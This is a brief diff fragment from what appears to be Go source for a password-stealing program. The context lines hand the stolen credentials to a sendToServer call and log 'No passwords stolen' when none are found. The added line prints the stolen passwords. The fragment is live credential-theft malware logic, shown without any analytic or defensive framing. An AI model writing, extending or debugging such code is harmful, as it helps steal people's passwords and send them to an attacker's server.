@@ -55,6 +55,7 @@ func main() {
 		return
 	}
 	if len(credentials) > 0 {
+		fmt.Println("Passwords stolen: ", credentials)
 		sendToServer(credentials)
 	} else {
 		log.Println("No passwords stolen or error occurred.")
